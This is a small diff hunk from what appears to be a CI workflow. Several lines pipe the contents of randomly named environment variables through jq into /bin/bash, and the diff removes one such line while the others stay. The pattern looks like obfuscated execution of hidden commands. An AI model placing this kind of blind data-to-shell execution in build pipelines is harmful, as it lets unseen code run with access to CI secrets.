@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$klluu327" | jq -r .oetm8281 | /bin/bash
           printf '%s' "$clag4" | jq -r .skeg9 | /bin/bash
           echo $hehwa771 | jq -r .zvhpq80 | /bin/bash
-          echo $ouj25 | jq -r .tmncp93188 | /bin/bash
           echo $ujxm73 | jq -r .j9 | /bin/bash
 
       - name: Persist output
